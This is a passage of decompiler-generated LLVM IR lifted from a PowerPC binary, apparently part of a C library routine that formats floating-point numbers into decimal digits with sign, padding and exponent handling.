  %v1_10011d04 = urem i32 %v1_10011d00, 256
  store i32 %v1_10011d04, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011d08

dec_label_pc_10011d08:                            ; preds = %entry, %dec_label_pc_10011d00
  %v0_10011dbc = phi i32 [ %v4_10011ce0, %entry ], [ %v1_10011d04, %dec_label_pc_10011d00 ]
  %v1_10011d08 = icmp slt i32 %v2_10011cf8, 0
  %v3_10011d08 = icmp eq i32 %v2_10011cf8, 0
  store i1 %v1_10011d08, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011d08, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10011cf8, -1
  br i1 %tmp75, label %dec_label_pc_10011d14, label %dec_label_pc_10011d10

dec_label_pc_10011d10:                            ; preds = %dec_label_pc_10011d08
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011d14

dec_label_pc_10011d14:                            ; preds = %dec_label_pc_10011d08, %dec_label_pc_10011d10
  %v0_10011ecc44 = phi i32 [ %v2_10011cf8, %dec_label_pc_10011d08 ], [ 6, %dec_label_pc_10011d10 ]
  %v1_10011d14 = add i32 %tmp, 12
  %v2_10011d14 = inttoptr i32 %v1_10011d14 to i32*
  %v3_10011d14 = load i32, i32* %v2_10011d14, align 4
  store i32 %v3_10011d14, i32* %r9.global-to-local, align 4
  %v1_10011d18 = and i32 %v3_10011d14, 2
  %v3_10011d18 = icmp eq i32 %v1_10011d18, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_10011d18, label %dec_label_pc_10011d30, label %dec_label_pc_10011d3c

dec_label_pc_10011d30:                            ; preds = %dec_label_pc_10011d14
  %v1_10011d30 = urem i32 %v3_10011d14, 2
  store i32 %v1_10011d30, i32* @r7, align 4
  %v3_10011d30 = icmp eq i32 %v1_10011d30, 0
  br i1 %v3_10011d30, label %dec_label_pc_10011d40, label %dec_label_pc_10011d3c

dec_label_pc_10011d3c:                            ; preds = %dec_label_pc_10011d30, %dec_label_pc_10011d14
  %storemerge = phi i32 [ 43, %dec_label_pc_10011d14 ], [ 32, %dec_label_pc_10011d30 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10011d3c = trunc i32 %storemerge to i8
  store i8 %v6_10011d3c, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10011d40

dec_label_pc_10011d40:                            ; preds = %dec_label_pc_10011d30, %dec_label_pc_10011d3c
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10011d08, label %dec_label_pc_10011ea4, label %dec_label_pc_10011dbc

dec_label_pc_10011dbc:                            ; preds = %dec_label_pc_10011d40
  %v1_10011dbc = icmp ult i32 %v0_10011dbc, 96
  %v2_10011dbc = icmp ugt i32 %v0_10011dbc, 96
  %v3_10011dbc = icmp eq i32 %v0_10011dbc, 96
  store i1 %v1_10011dbc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011dbc, i1* %cr7_eq.global-to-local, align 1
  %v2_10011dc4 = add i32 %tmp, 16
  %v3_10011dc4 = inttoptr i32 %v2_10011dc4 to i32*
  store i32 32, i32* %v3_10011dc4, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10011dbc, label %dec_label_pc_10011de8, label %dec_label_pc_10011ddc

dec_label_pc_10011ddc:                            ; preds = %dec_label_pc_10011dbc
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10011de8

dec_label_pc_10011de8:                            ; preds = %dec_label_pc_10011dbc, %dec_label_pc_10011ddc
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10018128.695 to i32), i32 8), %dec_label_pc_10011dbc ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10018128.695 to i32), i32 12), %dec_label_pc_10011ddc ]
  store i32 ptrtoint ([4 x i8]* @global_var_10018128.695 to i32), i32* %r9.global-to-local, align 4
  %v2_10011df4 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10011df4, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10012294

dec_label_pc_10011ea4:                            ; preds = %dec_label_pc_10011d40
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10011ea8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10011ea8, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10011ef4 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10011ec8

dec_label_pc_10011ec8:                            ; preds = %dec_label_pc_10011f48.dec_label_pc_10011ec8_crit_edge, %dec_label_pc_10011ea4
  %v0_10011ecc = phi i32 [ %v0_10011ecc.pre, %dec_label_pc_10011f48.dec_label_pc_10011ec8_crit_edge ], [ %v0_10011ecc44, %dec_label_pc_10011ea4 ]
  %v3_10011ecc = call %1 @__asm_cror(i32 %v0_10011ecc, i32 %tmp, i32 %v0_10011ecc)
  %v11_10011ecc = extractvalue %1 %v3_10011ecc, 7
  store i4 %v11_10011ecc, i4* @cr4, align 1
  %v0_10011ed0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10011ed0, label %dec_label_pc_10011ee4, label %dec_label_pc_10011ef8

dec_label_pc_10011ee4:                            ; preds = %dec_label_pc_10011ec8
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011ef8

dec_label_pc_10011ef8:                            ; preds = %dec_label_pc_10011ec8, %dec_label_pc_10011ee4
  %storemerge2 = phi i32 [ %v1_10011ef4, %dec_label_pc_10011ee4 ], [ %tmp55, %dec_label_pc_10011ec8 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10011f08 = load i32, i32* %r6.global-to-local, align 4
  %v1_10011f08 = add i32 %v0_10011f08, 9
  store i32 %v1_10011f08, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011f24

dec_label_pc_10011f24:                            ; preds = %dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge, %dec_label_pc_10011ef8
  %v1_10011f2c = phi i32 [ %v1_10011f2c.pre, %dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge ], [ %v1_10011f08, %dec_label_pc_10011ef8 ]
  %v0_10011f28 = phi i32 [ %v0_10011f28.pre, %dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge ], [ 0, %dec_label_pc_10011ef8 ]
  %v1_10011f24 = phi i32 [ %v1_10011f24.pre, %dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge ], [ 10, %dec_label_pc_10011ef8 ]
  %v1_10011f34 = phi i32 [ %v0_10011f24.pre, %dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge ], [ %storemerge2, %dec_label_pc_10011ef8 ]
  %v2_10011f24 = udiv i32 %v1_10011f34, %v1_10011f24
  store i32 %v2_10011f24, i32* %r0.global-to-local, align 4
  %v1_10011f28 = add i32 %v0_10011f28, 1
  store i32 %v1_10011f28, i32* %r8.global-to-local, align 4
  %v2_10011f2c = sub i32 %v1_10011f2c, %v1_10011f28
  store i32 %v2_10011f2c, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10011f24, -10
  store i32 %v2_10011f24, i32* %r10.global-to-local, align 4
  %v2_10011f34 = add i32 %v1_10011f34, 48
  %v1_10011f3c = add i32 %v2_10011f34, %tmp76
  store i32 %v1_10011f3c, i32* %r9.global-to-local, align 4
  %v1_10011f40 = trunc i32 %v1_10011f3c to i8
  %v3_10011f40 = inttoptr i32 %v2_10011f2c to i8*
  store i8 %v1_10011f40, i8* %v3_10011f40, align 1
  %v0_10011f44 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011f44 = add i32 %v0_10011f44, -1
  store i32 %v1_10011f44, i32* %ctr.global-to-local, align 4
  %v2_10011f44 = icmp eq i32 %v1_10011f44, 0
  br i1 %v2_10011f44, label %dec_label_pc_10011f48, label %dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge

dec_label_pc_10011f24.dec_label_pc_10011f24_crit_edge: ; preds = %dec_label_pc_10011f24
  %v0_10011f24.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10011f24.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10011f28.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10011f2c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10011f24

dec_label_pc_10011f48:                            ; preds = %dec_label_pc_10011f24
  %v0_10011f48 = load i32, i32* %r7.global-to-local, align 4
  %v1_10011f48 = icmp slt i32 %v0_10011f48, 0
  %v3_10011f48 = icmp eq i32 %v0_10011f48, 0
  store i1 %v1_10011f48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011f48, i1* %cr7_eq.global-to-local, align 1
  %v1_10011f4c = add i32 %v0_10011f48, 1
  store i32 %v1_10011f4c, i32* %r7.global-to-local, align 4
  br i1 %v3_10011f48, label %dec_label_pc_10011f48.dec_label_pc_10011ec8_crit_edge, label %dec_label_pc_10011f54

dec_label_pc_10011f48.dec_label_pc_10011ec8_crit_edge: ; preds = %dec_label_pc_10011f48
  %v0_10011ecc.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011ec8

dec_label_pc_10011f54:                            ; preds = %dec_label_pc_10011f48
  %v0_10011f54 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011f54 = icmp ult i32 %v0_10011f54, 96
  %v2_10011f54 = icmp ugt i32 %v0_10011f54, 96
  %v3_10011f54 = icmp eq i32 %v0_10011f54, 96
  store i1 %v1_10011f54, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011f54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10011f54, label %dec_label_pc_10011f6c, label %dec_label_pc_10011f5c

dec_label_pc_10011f5c:                            ; preds = %dec_label_pc_10011f54
  %v1_10011f64 = add i32 %v0_10011f54, 32
  store i32 %v1_10011f64, i32* %r0.global-to-local, align 4
  %v1_10011f68 = urem i32 %v1_10011f64, 256
  store i32 %v1_10011f68, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011f6c

dec_label_pc_10011f6c:                            ; preds = %dec_label_pc_10011f54, %dec_label_pc_10011f5c
  %v0_10011f84 = phi i32 [ %v1_10011f68, %dec_label_pc_10011f5c ], [ %v0_10011f54, %dec_label_pc_10011f54 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10011f5c ], [ 101, %dec_label_pc_10011f54 ]
  %v1_10011f6c = icmp slt i32 %v0_10011f84, 103
  %v3_10011f6c = icmp eq i32 %v0_10011f84, 103
  store i1 %v1_10011f6c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011f6c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011f6c, label %dec_label_pc_10011f74, label %dec_label_pc_10011f84

dec_label_pc_10011f74:                            ; preds = %dec_label_pc_10011f6c
  %v0_10011f74 = load i32, i32* %r30.global-to-local, align 4
  %v1_10011f74 = icmp slt i32 %v0_10011f74, 0
  %v3_10011f74 = icmp eq i32 %v0_10011f74, 0
  store i1 %v1_10011f74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011f74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011f74, label %dec_label_pc_10011f8c, label %dec_label_pc_10011f7c

dec_label_pc_10011f7c:                            ; preds = %dec_label_pc_10011f74
  %v1_10011f7c = add i32 %v0_10011f74, -1
  store i32 %v1_10011f7c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011f8c

dec_label_pc_10011f84:                            ; preds = %dec_label_pc_10011f6c
  %v1_10011f84 = icmp slt i32 %v0_10011f84, 102
  %v3_10011f84 = icmp eq i32 %v0_10011f84, 102
  store i1 %v1_10011f84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011f84, i1* %cr7_eq.global-to-local, align 1
  %v0_10011f94 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10011f84, label %dec_label_pc_10011f94, label %dec_label_pc_10011f8c

dec_label_pc_10011f8c:                            ; preds = %dec_label_pc_10011f84, %dec_label_pc_10011f74, %dec_label_pc_10011f7c
  %v0_10011f8c = phi i32 [ 0, %dec_label_pc_10011f74 ], [ %v1_10011f7c, %dec_label_pc_10011f7c ], [ %v0_10011f94, %dec_label_pc_10011f84 ]
  store i32 %v0_10011f8c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011fb8

dec_label_pc_10011f94:                            ; preds = %dec_label_pc_10011f84
  %v1_10011f94 = load i32, i32* %r4.global-to-local, align 4
  %v2_10011f94 = add i32 %v1_10011f94, %v0_10011f94
  store i32 %v2_10011f94, i32* %r10.global-to-local, align 4
  %v1_10011f98 = icmp slt i32 %v2_10011f94, -1
  %v3_10011f98 = icmp eq i32 %v2_10011f94, -1
  store i1 %v1_10011f98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011f98, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10011f94, -2
  br i1 %tmp77, label %dec_label_pc_10011fb8, label %dec_label_pc_10011fa0

dec_label_pc_10011fa0:                            ; preds = %dec_label_pc_10011f94
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10011fa4 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10011fa4, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268509104, i32* @lr, align 4
  %v3_10011fac = call i32 @__GI_memset(i32 %v2_10011fa4, i32 48, i32 17)
  store i32 %v3_10011fac, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011fb8

dec_label_pc_10011fb8:                            ; preds = %dec_label_pc_10011f94, %dec_label_pc_10011f8c, %dec_label_pc_10011fa0
  %v1_10011fdc = phi i32 [ %v2_10011f94, %dec_label_pc_10011f94 ], [ %v0_10011f8c, %dec_label_pc_10011f8c ], [ -1, %dec_label_pc_10011fa0 ]
  %v1_10011fb8 = icmp slt i32 %v1_10011fdc, 16
  %v2_10011fb8 = icmp sgt i32 %v1_10011fdc, 16
  %v3_10011fb8 = icmp eq i32 %v1_10011fdc, 16
  store i1 %v1_10011fb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011fb8, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10011fcc = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10011fcc, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10011fb8, label %dec_label_pc_10011ff4, label %dec_label_pc_10011fd8

dec_label_pc_10011fd8:                            ; preds = %dec_label_pc_10011fb8
  %v2_10011fd8 = ptrtoint i32* %stack_var_-177 to i32
  %v2_10011fdc = add i32 %v1_10011fdc, %v2_10011fd8
  store i32 %v2_10011fdc, i32* %r9.global-to-local, align 4
  %v1_10011fe0 = add i32 %v2_10011fdc, 2
  %v2_10011fe0 = inttoptr i32 %v1_10011fe0 to i8*
  %v3_10011fe0 = load i8, i8* %v2_10011fe0, align 1
  %v4_10011fe0 = zext i8 %v3_10011fe0 to i32
  store i32 %v4_10011fe0, i32* %r0.global-to-local, align 4
  store i32 %v1_10011fe0, i32* %r11.global-to-local, align 4
  %v1_10011fe8 = sub nsw i32 52, %v4_10011fe0
  %v2_10011fe8 = sub nuw nsw i32 -1, %v4_10011fe0
  %not.v5_10011fe8 = icmp ugt i32 %v1_10011fe8, %v2_10011fe8
  %v1_10011ff0 = zext i1 %not.v5_10011fe8 to i32
  store i32 %v1_10011ff0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011ff4

dec_label_pc_10011ff4:                            ; preds = %dec_label_pc_10011fb8, %dec_label_pc_10011fd8, %dec_label_pc_10011ff4.backedge
  %v0_10011ff8 = phi i32 [ %v0_10011ff8.pre, %dec_label_pc_10011ff4.backedge ], [ 0, %dec_label_pc_10011fb8 ], [ %v1_10011ff0, %dec_label_pc_10011fd8 ]
  %v0_10011ff4 = phi i32 [ %v0_10011ff4.pre, %dec_label_pc_10011ff4.backedge ], [ %v2_10011fcc, %dec_label_pc_10011fb8 ], [ %v1_10011fe0, %dec_label_pc_10011fd8 ]
  %v1_10011ff4 = add i32 %v0_10011ff4, -1
  %v2_10011ff4 = inttoptr i32 %v1_10011ff4 to i8*
  %v3_10011ff4 = load i8, i8* %v2_10011ff4, align 1
  %v4_10011ff4 = zext i8 %v3_10011ff4 to i32
  store i32 %v1_10011ff4, i32* %r11.global-to-local, align 4
  %v2_10011ff8 = add i32 %v4_10011ff4, %v0_10011ff8
  store i32 %v2_10011ff8, i32* %r0.global-to-local, align 4
  %v1_10011ffc = urem i32 %v2_10011ff8, 256
  store i32 %v1_10011ffc, i32* %r9.global-to-local, align 4
  %v1_10012000 = trunc i32 %v2_10011ff8 to i8
  store i8 %v1_10012000, i8* %v2_10011ff4, align 1
  %v0_10012004 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012004 = icmp slt i32 %v0_10012004, 48
  %v3_10012004 = icmp eq i32 %v0_10012004, 48
  store i1 %v1_10012004, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012004, i1* %cr7_eq.global-to-local, align 1
  %v1_10012008 = icmp ult i32 %v0_10012004, 57
  %v2_10012008 = icmp ugt i32 %v0_10012004, 57
  %v3_10012008 = icmp eq i32 %v0_10012004, 57
  store i1 %v1_10012008, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10012008, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10012008, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10012004, %v2_10012008
  br i1 %brmerge, label %dec_label_pc_10011ff4.backedge, label %dec_label_pc_10012014

dec_label_pc_10011ff4.backedge:                   ; preds = %dec_label_pc_10011ff4
  %v0_10011ff4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10011ff8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011ff4

dec_label_pc_10012014:                            ; preds = %dec_label_pc_10011ff4
  %v2_10012014 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10012014, i32* %r0.global-to-local, align 4
  %v0_10012018 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10012018, i32* @r7, align 4
  %v0_1001201c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001201c = icmp ult i32 %v0_1001201c, %v2_10012014
  %v3_1001201c = icmp ugt i32 %v0_1001201c, %v2_10012014
  %v4_1001201c = icmp eq i32 %v0_1001201c, %v2_10012014
  store i1 %v2_1001201c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001201c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10011ea8, i32* %r8.global-to-local, align 4
  br i1 %v3_1001201c, label %dec_label_pc_10012034, label %dec_label_pc_10012028

dec_label_pc_10012028:                            ; preds = %dec_label_pc_10012014
  store i32 %v2_10012014, i32* %r8.global-to-local, align 4
  %v1_1001202c = add i32 %v0_10012018, 1
  store i32 %v1_1001202c, i32* @r7, align 4
  store i32 %v2_10012014, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012034

dec_label_pc_10012034:                            ; preds = %dec_label_pc_10012014, %dec_label_pc_10012028
  %v2_1001203c = phi i32 [ %v0_1001201c, %dec_label_pc_10012014 ], [ %v2_10012014, %dec_label_pc_10012028 ]
  %v0_10012034 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012034 = icmp slt i32 %v0_10012034, 103
  %v3_10012034 = icmp eq i32 %v0_10012034, 103
  store i1 %v1_10012034, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012034, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1001203c = add i32 %v2_1001203c, 1
  %v4_1001203c = inttoptr i32 %v3_1001203c to i8*
  store i8 0, i8* %v4_1001203c, align 1
  %v0_10012040 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012040 = add i32 %v0_10012040, 1
  store i32 %v1_10012040, i32* %r9.global-to-local, align 4
  %v0_10012044 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012044, label %dec_label_pc_10012048, label %dec_label_pc_1001206c

dec_label_pc_10012048:                            ; preds = %dec_label_pc_10012034
  %v0_10012048 = load i32, i32* @r7, align 4
  %v1_10012048 = icmp slt i32 %v0_10012048, -4
  %v3_10012048 = icmp eq i32 %v0_10012048, -4
  store i1 %v1_10012048, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012048, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10012048, label %dec_label_pc_10012064, label %dec_label_pc_10012050

dec_label_pc_10012050:                            ; preds = %dec_label_pc_10012048
  %v1_10012050 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012050 = icmp sgt i32 %v1_10012050, %v0_10012048
  %v3_10012050 = icmp slt i32 %v1_10012050, %v0_10012048
  %v4_10012050 = icmp eq i32 %v1_10012050, %v0_10012048
  store i1 %v2_10012050, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012050, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012050, label %dec_label_pc_10012064, label %dec_label_pc_10012058

dec_label_pc_10012058:                            ; preds = %dec_label_pc_10012050
  %v2_10012058 = sub i32 %v1_10012050, %v0_10012048
  store i32 %v2_10012058, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012084

dec_label_pc_10012064:                            ; preds = %dec_label_pc_10012050, %dec_label_pc_10012048
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012078

dec_label_pc_1001206c:                            ; preds = %dec_label_pc_10012034
  %v0_1001206c = load i32, i32* %r31.global-to-local, align 4
  %v1_1001206c = icmp slt i32 %v0_1001206c, 102
  %v3_1001206c = icmp eq i32 %v0_1001206c, 102
  store i1 %v1_1001206c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001206c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1001206c, i32* %r4.global-to-local, align 4
  br i1 %v3_1001206c, label %dec_label_pc_10012084thread-pre-split, label %dec_label_pc_10012078

dec_label_pc_10012078:                            ; preds = %dec_label_pc_1001206c, %dec_label_pc_10012064
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10012098

dec_label_pc_10012084thread-pre-split:            ; preds = %dec_label_pc_1001206c
  %v0_10012084.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10012084

dec_label_pc_10012084:                            ; preds = %dec_label_pc_10012084thread-pre-split, %dec_label_pc_10012058
  %v0_10012088 = phi i32 [ %v0_10012084.pr, %dec_label_pc_10012084thread-pre-split ], [ %v0_10012048, %dec_label_pc_10012058 ]
  %v1_10012084 = icmp slt i32 %v0_10012088, 0
  %v2_10012084 = icmp sgt i32 %v0_10012088, 0
  %v3_10012084 = icmp eq i32 %v0_10012088, 0
  store i1 %v1_10012084, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10012084, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10012084, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10012088, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10012088, -1
  br i1 %tmp78, label %dec_label_pc_10012098, label %dec_label_pc_10012090

dec_label_pc_10012090:                            ; preds = %dec_label_pc_10012084
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10012094 = load i32, i32* %r8.global-to-local, align 4
  %v3_10012094 = add i32 %v2_10012094, -1
  %v4_10012094 = inttoptr i32 %v3_10012094 to i8*
  store i8 48, i8* %v4_10012094, align 1
  store i32 %v3_10012094, i32* %r8.global-to-local, align 4
  %v1_100120b4.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100120c8.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10012098

dec_label_pc_10012098:                            ; preds = %dec_label_pc_10012084, %dec_label_pc_10012078, %dec_label_pc_10012090
  %v0_100120c8 = phi i1 [ %v1_10012084, %dec_label_pc_10012084 ], [ false, %dec_label_pc_10012078 ], [ %v0_100120c8.pre, %dec_label_pc_10012090 ]
  %v1_100120b4 = phi i32 [ %v1_10012040, %dec_label_pc_10012084 ], [ %v1_10012040, %dec_label_pc_10012078 ], [ %v1_100120b4.pre, %dec_label_pc_10012090 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_100120a4 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_100120a4, i32* %r0.global-to-local, align 4
  %v0_100120ac = load i32, i32* %r8.global-to-local, align 4
  %v1_100120ac = add i32 %v0_100120ac, 1
  store i32 %v1_100120ac, i32* %r6.global-to-local, align 4
  %v2_100120b4 = sub i32 %v1_100120b4, %v1_100120ac
  store i32 %v2_100120b4, i32* %r11.global-to-local, align 4
  %v1_100120b8 = inttoptr i32 %v0_100120ac to i8*
  %v2_100120b8 = load i8, i8* %v1_100120b8, align 1
  %v3_100120b8 = zext i8 %v2_100120b8 to i32
  store i32 %v3_100120b8, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_100120c8, label %dec_label_pc_10012128, label %dec_label_pc_100120cc

dec_label_pc_100120cc:                            ; preds = %dec_label_pc_10012098
  %v0_100120cc = load i32, i32* %r10.global-to-local, align 4
  %v2_100120cc = icmp slt i32 %v0_100120cc, %v2_100120b4
  %v4_100120cc = icmp eq i32 %v0_100120cc, %v2_100120b4
  store i1 %v2_100120cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100120cc, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_100120cc, label %dec_label_pc_10012120, label %dec_label_pc_100120e0

dec_label_pc_100120e0:                            ; preds = %dec_label_pc_100120cc
  %v2_100120e0 = sub i32 %v0_100120cc, %v2_100120b4
  store i32 %v2_100120e0, i32* %r0.global-to-local, align 4
  %v4_100120e0 = icmp sgt i32 %v2_100120e0, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_100120e0, label %dec_label_pc_100120fc, label %dec_label_pc_100120ec

dec_label_pc_100120ec:                            ; preds = %dec_label_pc_100120e0
  %v2_100120f0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_100120f0, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012144

dec_label_pc_100120fc:                            ; preds = %dec_label_pc_100120e0
  store i32 ptrtoint (i32* @global_var_1001812b.697 to i32), i32* %r9.global-to-local, align 4
  %v2_10012108 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10012108, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10012144

dec_label_pc_10012120:                            ; preds = %dec_label_pc_100120cc
  %v0_10012120 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10012120, label %dec_label_pc_10012130, label %dec_label_pc_10012124

dec_label_pc_10012124:                            ; preds = %dec_label_pc_10012120
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012128

dec_label_pc_10012128:                            ; preds = %dec_label_pc_10012098, %dec_label_pc_10012124
  %v2_10012128 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10012128, i32* @r8, align 4
  br label %dec_label_pc_10012144

dec_label_pc_10012130:                            ; preds = %dec_label_pc_10012120
  %v2_10012130 = sub i32 %v2_100120b4, %v0_100120cc
  store i32 %v2_10012130, i32* %r11.global-to-local, align 4
  %v2_10012138 = add i32 %v0_100120cc, %v1_100120ac
  store i32 %v2_10012138, i32* %r6.global-to-local, align 4
  %v2_1001213c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1001213c, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012144

dec_label_pc_10012144:                            ; preds = %dec_label_pc_10012128, %dec_label_pc_100120fc, %dec_label_pc_100120ec, %dec_label_pc_10012130
  %v1_10012170 = phi i32 [ %v2_10012128, %dec_label_pc_10012128 ], [ %v2_10012108, %dec_label_pc_100120fc ], [ %v2_100120f0, %dec_label_pc_100120ec ], [ %v2_1001213c, %dec_label_pc_10012130 ]
  %v0_10012150 = phi i32 [ %v2_100120b4, %dec_label_pc_10012128 ], [ 0, %dec_label_pc_100120fc ], [ 0, %dec_label_pc_100120ec ], [ %v2_10012130, %dec_label_pc_10012130 ]
  %v3_10012144 = load i32, i32* %v2_10011d14, align 4
  store i32 %v3_10012144, i32* %r0.global-to-local, align 4
  %v1_10012148 = and i32 %v3_10012144, 16
  store i32 %v1_10012148, i32* %r9.global-to-local, align 4
  %v3_10012148 = icmp eq i32 %v1_10012148, 0
  br i1 %v3_10012148, label %dec_label_pc_10012150, label %dec_label_pc_10012168

